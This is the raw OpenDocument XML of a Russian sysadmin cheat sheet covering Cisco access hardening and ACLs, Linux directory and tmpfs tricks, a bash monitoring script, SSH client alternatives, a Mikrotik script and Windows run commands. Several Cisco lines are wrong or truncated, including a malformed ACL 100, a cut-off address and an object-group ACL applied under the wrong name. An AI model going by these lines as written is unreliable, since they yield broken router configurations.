      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">Отключаем ошибку резолва при неправильном наборе чего-либо в консоли - </text:span><text:span text:style-name="T3">no</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">ip</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">domain</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">lookup</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">Задаём </text:span><text:span text:style-name="T3">timeout</text:span><text:span text:style-name="T1"> неактивности </text:span><text:span text:style-name="T3">telnet</text:span><text:span text:style-name="T1"> сессии - </text:span><text:span text:style-name="T3">exec</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">timeout</text:span><text:span text:style-name="T1"> 15 0</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Cisco</text:span><text:span text:style-name="T1"> (защищаем доступ):</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Установим пароль на доступ через консольный порт -</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">line</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">console</text:span><text:span text:style-name="T1"> 0</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">login</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">password</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">password</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">Создаём </text:span><text:span text:style-name="T3">access</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">list</text:span><text:span text:style-name="T1"> с разрешёнными для доступа сетями или хостами (пишем сети с обратной маской)</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T3">access-list 1 permit 192.168.1.0 0.0.0.255 </text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">access-list 1 permit 192.168.2.0 0.0.0.255</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Отключаем доступ по виртуальному терминалу для протокола </text:span><text:span text:style-name="T3">telnet</text:span><text:span text:style-name="T1"> и применяем ранее созданный </text:span><text:span text:style-name="T3">access</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">list</text:span><text:span text:style-name="T1"> для ограничения доступа по </text:span><text:span text:style-name="T3">ssh</text:span><text:span text:style-name="T1"> -</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">line vty 0 4 </text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">transport input ssh </text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">access-class 1 in </text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">privilege level 15 </text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">login local </text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Добавляем watch for login Attacks - </text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">login block-for 600 attempts 2 within 30 </text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">login delay 5 </text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3">login quiet-mode access-class 1</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Cisco. ACL:</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Стандартные ACL - </text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">access-list 100 permit host 172.16.6.0 0.0.0.255</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">access-list 100 deny host 172.16.6.0 0.0.0.255</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Расширенные ACL - </text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">ip access-list extended TEST</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s/>permit tcp host 172.16.6.66 host 172.16.0. eq ftp</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s/>permit tcp host 172.16.6.66 gt 1023 any eq www</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">deny</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">ip</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">any</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">any</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">т.е. если явно что-то не разрешить сверху, то это будет запрещено</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Вешаем </text:span><text:span text:style-name="T3">ACL</text:span><text:span text:style-name="T1"> на интерфейс (</text:span><text:span text:style-name="T3">in</text:span><text:span text:style-name="T1"> или </text:span><text:span text:style-name="T3">out</text:span><text:span text:style-name="T1">) - </text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">ip</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">access</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">group</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">TEST</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">out</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Иногда необходимо удалить конкретную запись в </text:span><text:span text:style-name="T3">access</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">list</text:span><text:span text:style-name="T1"> (для примера </text:span><text:span text:style-name="T3">ip</text:span><text:span text:style-name="T1"> 94.123.2.139). Для этого, сначала смотрим порядковые номера записей - </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">show</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">access</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">lists</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Standard</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">IP</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">access</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">list</text:span><text:span text:style-name="T1"> 1</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"><text:s/></text:span><text:span text:style-name="T3">10 permit 185.40.30.134</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:soft-page-break/><text:span text:style-name="T3"><text:s/>20 permit 94.141.60.123</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s/>30 permit 94.123.2.139</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s/>90 permit 88.196.234.16</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s/>50 permit 222.251.243.67</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s/>40 permit 143.35.7.238</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Затем удаляем нужную - </text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># conf t</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">(config)# ip access-list s 1</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">(config-ext-nacl)# no 30</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">В данном случае S - Standard Access List</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Если вдруг понадобилось вставить запись в конкретное место, делаем так:</text:span></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T3"># conf t</text:span></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T3">(config)# ip access-list s 1</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">(config-ext-nacl)# 40 permit 94.123.2.139</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">OBJECT-GROUP</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Предположим, надо составить </text:span><text:span text:style-name="T3">ACL</text:span><text:span text:style-name="T1">, выпускающий три определенных адреса в интернет по трем одинаковым портам </text:span><text:span text:style-name="T3">c</text:span><text:span text:style-name="T1"> перспективой расширения количества адресов и портов. </text:span><text:span text:style-name="T3">Создаём список разрешённых портов - </text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">object-group service INET-PORTS</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">description Ports allowed for some hosts</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">tcp eq www</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">tcp eq 8080</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">tcp</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">eq</text:span><text:span text:style-name="T1"> 443</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Создаём список разрешённых ипишек - </text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">object-group network HOSTS-TO-INET</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">description Hosts allowed to browse the net</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">host 172.16.0.2</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">host 172.16.0.3</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">host 172.16.0.4</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Создаём ACL - </text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">ip access-list extended INET-OUT</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">permit object-group INET-PORTS object-group HOSTS-TO-INET any</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">И в завершении вешаем </text:span><text:span text:style-name="T3">ACL</text:span><text:span text:style-name="T1"> на интерфейс - </text:span></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3">ip</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">access</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">group</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">TEST</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">out</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Как скопировать структуру директорий в </text:span><text:span text:style-name="T3">Linux</text:span><text:span text:style-name="T1">:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Сначала необходимо перейти в директорию, где находятся нужная структура</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">cd</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">dir</text:span><text:span text:style-name="T1">1</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Затем выполняем команду, которая находит директории и сохраняет пути к ни в файл</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">find</text:span><text:span text:style-name="T1"> . -</text:span><text:span text:style-name="T3">type</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">d</text:span><text:span text:style-name="T1"> &gt; </text:span><text:span text:style-name="T3">dirs</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">txt</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Теперь необходимо перенести этот файл в директорию, где мы хотим воссоздать структуру</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">mv</text:span><text:span text:style-name="T1"> ./</text:span><text:span text:style-name="T3">dirs</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">txt</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">dir</text:span><text:span text:style-name="T1">2</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">Переходим туда</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">cd</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">dir</text:span><text:span text:style-name="T1">2</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">И используя </text:span><text:span text:style-name="T3">xargs</text:span><text:span text:style-name="T1"> читаем из файла пути и создаем по ним структуру директорий</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">xargs</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">mkdir</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">p</text:span><text:span text:style-name="T1"> &lt; </text:span><text:span text:style-name="T3">dirs</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">txt</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Как увеличить размер каталога /</text:span><text:span text:style-name="T3">tmp</text:span><text:span text:style-name="T1">/:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Иногда необходимо увеличить размер каталога, который в свою очередь находится в корневом каталоге системы.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Решить это можно перемонтированием каталога: </text:span><text:span text:style-name="T3">mount</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">t</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">tmpfs</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">tmpfs</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">tmp</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">o</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">size</text:span><text:span text:style-name="T1">=1024</text:span><text:span text:style-name="T3">M</text:span><text:span text:style-name="T1">,</text:span><text:span text:style-name="T3">mode</text:span><text:span text:style-name="T1">=1777,</text:span><text:span text:style-name="T3">remount</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Теперь проверим, есть ли у нас каталог в фстабе: </text:span><text:span text:style-name="T3">cat</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">etc</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">fstab</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Если нет, создаем, если существует то выполняем следующую команду: </text:span><text:span text:style-name="T3">none</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">tmp</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">tmpfs</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">size</text:span><text:span text:style-name="T1">=1024</text:span><text:span text:style-name="T3">M</text:span><text:span text:style-name="T1">,</text:span><text:span text:style-name="T3">mode</text:span><text:span text:style-name="T1">=1777,</text:span><text:span text:style-name="T3">rw</text:span><text:span text:style-name="T1"> 0 0</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T1">Теперь готов каталог/</text:span><text:span text:style-name="T3">tmp</text:span><text:span text:style-name="T1">/ с размером, указанным в операторе “</text:span><text:span text:style-name="T3">size</text:span><text:span text:style-name="T1">” размером 1024 </text:span><text:span text:style-name="T3">mb</text:span><text:span text:style-name="T1">.</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T1">Скрипт </text:span><text:span text:style-name="T3">Bash </text:span><text:span text:style-name="T1">для проверки производительности системы в реальном времени, а также для сбора статистики использования за определенное время:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">#!/bin/bash</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># This script monitors CPU and memory usage</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">while :</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">do </text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="2"/># Get the current usage of CPU and memory</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="2"/>cpuUsage=$(top -bn1 | awk '/Cpu/ { print $2}')</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="2"/>memUsage=$(free -m | awk '/Mem/{print $3}')</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="2"/># Print the usage</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="2"/>echo "CPU Usage: $cpuUsage%"</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="2"/>echo "Memory Usage: $memUsage MB"</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="2"/># Sleep for 1 second</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="2"/>sleep 1</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T2"><text:span text:style-name="T3">done</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Подборка</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">из</text:span><text:span text:style-name="T3"> 4</text:span><text:span text:style-name="T1">х</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">альтернативых</text:span><text:span text:style-name="T3"> SSH </text:span><text:span text:style-name="T1">клиентов</text:span><text:span text:style-name="T3">:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">1. </text:span><text:span text:style-name="T3">https</text:span><text:span text:style-name="T1">://</text:span><text:span text:style-name="T3">mosh</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">org</text:span><text:span text:style-name="T1">/ - свободное программное обеспечение, доступное для </text:span><text:span text:style-name="T3">GNU</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">Linux</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">BSD</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">macOS</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">Solaris</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">Android</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">Chrome</text:span><text:span text:style-name="T1"> и </text:span><text:span text:style-name="T3">iOS</text:span><text:span text:style-name="T1">. </text:span><text:span text:style-name="T3">Mosh</text:span><text:span text:style-name="T1"> - это замена интерактивных терминалов </text:span><text:span text:style-name="T3">SSH</text:span><text:span text:style-name="T1">. Он более надежен и отзывчив, особенно при работе через </text:span><text:span text:style-name="T3">Wi</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">Fi</text:span><text:span text:style-name="T1">, сотовую связь и на дальних расстояниях;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">2. </text:span><text:span text:style-name="T3">https</text:span><text:span text:style-name="T1">://</text:span><text:span text:style-name="T3">goteleport</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">com</text:span><text:span text:style-name="T1">/ - </text:span><text:span text:style-name="T3">Teleport</text:span><text:span text:style-name="T1">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3">Linux</text:span><text:span text:style-name="T1"> и </text:span><text:span text:style-name="T3">Windows</text:span><text:span text:style-name="T1">, кластерам </text:span><text:span text:style-name="T3">Kubernetes</text:span><text:span text:style-name="T1">, базам данных и приложениям </text:span><text:span text:style-name="T3">DevOps</text:span><text:span text:style-name="T1">, таким как </text:span><text:span text:style-name="T3">AWS</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">Management</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">Console</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">CI</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">CD</text:span><text:span text:style-name="T1">, контроль версий и панели мониторинга во всех средах;</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">3. </text:span><text:span text:style-name="T3">https</text:span><text:span text:style-name="T1">://</text:span><text:span text:style-name="T3">eternalterminal</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">dev</text:span><text:span text:style-name="T1">/ - Удаленный терминал для занятых и нетерпеливых. </text:span><text:span text:style-name="T3">Eternal</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">Terminal</text:span><text:span text:style-name="T1"> (</text:span><text:span text:style-name="T3">ET</text:span><text:span text:style-name="T1">) - удаленная оболочка, которая автоматически переподключается, не прерывая сеанса;</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">4. </text:span><text:span text:style-name="T3">https</text:span><text:span text:style-name="T1">://</text:span><text:span text:style-name="T3">github</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">com</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">tmux</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">tmux</text:span><text:span text:style-name="T1"> - терминальный мультиплексор: он позволяет создавать несколько терминалов, получать к ним доступ и управлять ими с одного экрана. </text:span><text:span text:style-name="T3">tmux</text:span><text:span text:style-name="T1"> может работать в фоновом режиме. Работает на </text:span><text:span text:style-name="T3">OpenBSD</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">FreeBSD</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">NetBSD</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">Linux</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">macOS</text:span><text:span text:style-name="T1"> и </text:span><text:span text:style-name="T3">Solaris</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Примеры скриптов для </text:span><text:span text:style-name="T3">Mikrotik</text:span><text:span text:style-name="T1">:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Проверьте, не изменился ли </text:span><text:span text:style-name="T3">IP</text:span><text:span text:style-name="T1">-адрес на интерфейсе. Иногда провайдер выдает динамические </text:span><text:span text:style-name="T3">IP</text:span><text:span text:style-name="T1">-адреса. Этот скрипт сравнит, изменился ли динамический </text:span><text:span text:style-name="T3">IP</text:span><text:span text:style-name="T1">-адрес:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">:global currentIP;</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">:local newIP [/ip address get [find interface="ether1"] address];</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">:if ($newIP != $currentIP) do={</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="4"/>:put "ip address $currentIP changed to $newIP";</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="4"/>:set currentIP $newIP;</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">}</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Все скрипты:</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P9" loext:marker-style-name="T2"><text:span text:style-name="T3">https://wiki.mikrotik.com/wiki/Manual:Scripting-examples</text:span></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T1">Шпаргалка по </text:span><text:span text:style-name="T3">run</text:span><text:span text:style-name="T1"> командам </text:span><text:span text:style-name="T3">Windows</text:span><text:span text:style-name="T1">:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">msconfig</text:span><text:span text:style-name="T1"> - Системные настройки.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">msinfo</text:span><text:span text:style-name="T1">32 - Информация о системе.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">resmon</text:span><text:span text:style-name="T1"> - Монитор ресурсов.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">main</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">cpl</text:span><text:span text:style-name="T1"> - Свойства мыши.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">mstsc</text:span><text:span text:style-name="T1"> - Подключение к удаленному рабочему столу.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">cmd</text:span><text:span text:style-name="T1"> - Командная строка.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">explorer</text:span><text:span text:style-name="T1"> - Проводник </text:span><text:span text:style-name="T3">Windows</text:span><text:span text:style-name="T1">.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">taskmgr</text:span><text:span text:style-name="T1"> - Диспетчер задач.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">shutdown</text:span><text:span text:style-name="T1"> - Выключение компьютера.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">chkdsk</text:span><text:span text:style-name="T1"> - Проверка диска.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">cleanmgr</text:span><text:span text:style-name="T1"> - Очистка диска.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">dxdiag - Параметры</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">powershell - Консоль Windows PowerShell.</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">winver - Версия</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">controlfolders - Параметры папок.</text:span><text:span text:style-name="T3"/></text:p>
